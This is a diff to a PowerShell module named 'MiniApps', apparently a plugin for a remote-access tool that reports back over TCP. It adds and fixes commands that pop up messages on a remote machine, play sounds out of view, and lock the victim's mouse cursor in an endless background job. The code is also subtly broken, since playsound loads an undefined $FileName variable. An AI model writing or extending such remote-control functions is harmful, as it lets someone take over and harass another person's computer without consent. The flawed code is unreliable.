@@ -1,6 +1,6 @@
 #MiniApps
-#1.0FIX
-#@{"message" = "[box/notepad] displays your message"; "playsound" = "[FileName] plays a wav hidden"; "mouse" = "[lock, unlock]"}
+#1.1
+#@{"message" = "[box/notepad] [Message] <slow> displays your message"; "playsound" = "[FileName] plays a wav hidden"; "mouse" = "[lock, unlock]"}
 #""
 
 function message ($style, $message, [switch]$slow)
@@ -35,14 +35,15 @@ function message ($style, $message, [switch]$slow)
 
 function playsound ($file)
 {
-	$file = $file.Replace("~", " ")
-	$file = (Get-Item $file).FullName
-	$player = New-Object System.Media.SoundPlayer
-	
 	try
 	{
+		$file = $file.Replace("~", " ")
+		$file = (Get-Item $file).FullName
+		$player = New-Object System.Media.SoundPlayer
+
 		$player.Load($FileName)
 		$player.Play()
+		WriteTCPMessage "`nPlaying Now!`n"
 	}
 	catch {WriteTCPMessage "`nUnable to Play file`n"}
 	Remove-Variable file, player -ErrorAction SilentlyContinue
@@ -54,14 +55,16 @@ function mouse ($argument)
 	
 	if ($argument -eq "lock")
 	{
-		$lock = Start-Process powershell.exe { Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = @{ x = 0; y = 0 } } } -WindowStyle Hidden -PassThru
+		$Global:lock = Start-Job -ScriptBlock { Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = @{ x = 0; y = 0 } } } 
 		WriteTCPMessage "`nMouse Locked!`n"
 	}
-	if ($argument -eq "unlock")
+	elseif ($argument -eq "unlock")
 	{
-		WriteTCPMessage "Doesnt work no matter what I try D:"
+		$Global:lock.StopJob()
+		WriteTCPMessage "`nMouse Unlocked!`n"
 	}
-	
+	else { WriteTCPMessage "`nInvalid Command!`n" }
+
 	Remove-Variable argument, lock, process -ErrorAction SilentlyContinue
 	
 }
